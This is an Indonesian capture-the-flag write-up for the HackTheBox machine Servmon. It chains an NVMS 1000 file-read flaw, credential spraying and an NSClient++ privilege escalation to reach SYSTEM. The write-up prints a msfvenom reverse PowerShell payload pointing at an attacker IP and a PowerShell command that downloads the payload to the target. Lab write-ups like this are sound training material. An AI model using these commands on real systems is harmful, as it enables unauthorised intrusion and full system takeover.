HackTheBox. Passage of Servmon. Memanfaatkan kerentanan dalam NVMS dan NSClient ++







Saya terus mempublikasikan solusi yang dikirim untuk pemrosesan mesin lebih lanjut dari situs HackTheBox .



Koneksi ke laboratorium adalah melalui VPN. Dianjurkan agar Anda tidak terhubung dari komputer kerja atau dari host di mana data penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang mengetahui sesuatu di bidang keamanan informasi.

Recon



Mesin ini memiliki alamat IP 10.10.10.184, yang saya tambahkan ke / etc / hosts. 



10.10.10.184    servmon.htb


Pertama, kami memindai port terbuka. Karena butuh waktu lama untuk memindai semua port dengan nmap, pertama-tama saya akan melakukan ini dengan masscan. Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 500 paket per detik. 



masscan -e tun0 -p1-65535,U:1-65535 10.10.10.184    --rate=500






Tuan rumah memiliki banyak port terbuka. Sekarang pindai dengan nmap untuk memfilter dan pilih yang Anda butuhkan. 



nmap servmon.htb -p21,80,49667,49669,22,139,49668,8443,49670,6699,6063,49666,5666,5040,7680,49664,49665,445,135






Sekarang, untuk informasi lebih rinci tentang layanan yang beroperasi pada port, kami akan menjalankan pemindaian dengan opsi -A. 



nmap -A servmon.htb -p21,80,22,139,8443,6699,6063,5666,5040,7680,445,135






Seperti yang dapat dilihat dari pemindaian nmap, dimungkinkan untuk bekerja dengan server FTP atas nama anonim. Kami masuk dan melihat-lihat.







Ada dua file, mari kita unduh dan lihat.











PENGGUNA



Jadi kita melihat daftar tugas (beberapa di antaranya belum selesai), dan kita juga tahu bahwa file dengan kata sandi ada di desktop. Sekarang lihat di web.







Mari kita lihat eksploitasi untuk NVMS.







Dan kami menemukannya untuk NVMS 1000. Kami mencari tahu tentang apa itu.







Artinya, kita dapat membaca file di sistem ketika mengakses melalui HTTP 1.1. Mari kita periksa.







Semuanya berfungsi. Kami tahu di mana kata sandi terletak. Ayo lihat.







Dan kami mendapatkan beberapa kata sandi. Jadi kami memiliki beberapa layanan tempat kami dapat memilah login: pasangan kata sandi. Saya melakukan ini di seseorang menggunakan CrackMapExec.







Terhubung melalui SSH dan dapatkan bendera pengguna.







AKAR



Memeriksa layanan yang disediakan oleh nmap, NSClient berjalan pada port 8443.







Dan baginya, kami juga menemukan exploit.







Dengan demikian, pengguna lokal dengan hak istimewa rendah dapat membaca kata sandi administrator web dalam teks yang jelas dari file konfigurasi.

Karena layanan NSClient ++ berjalan sebagai suatu sistem, pengguna dengan tingkat privilege rendah dapat menerima eskalasi privilege.

Pertama-tama, Anda perlu mendapatkan kata sandi administrator web.

type "c:\program files\nsclient++\nsclient.ini"











Kami melihat host yang diizinkan - localhost. Mari kita dapatkan port SHH.

ssh -L 8444:127.0.0.1:8443 nadine@servmon.htb





Untuk kerentanan ini, agar tidak menyelesaikan semua tindakan secara manual, saya menggunakan exploit RCE otomatis .



Pertama, kami menghasilkan beban yang akan kami lakukan untuk koneksi balik dan menjalankan pendengar. 



msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.60 lport=4321 > ./1.bat






Sekarang di host jarak jauh, unduh file bat yang diberikan dari mesin lokal. 



powershell -c "wget http://10.10.15.60:88/1.bat -O C:\Temp\a.bat"


Ketika semuanya sudah siap, kami meluncurkan exploit (apakah exploit tidak stabil, atau mesin, tetapi hanya berhasil menyelesaikan ketiga kalinya).







Dan dalam metasplit kami mengamati penciptaan sesi yang sukses.







Kami memiliki hak sistem pada mesin ini!
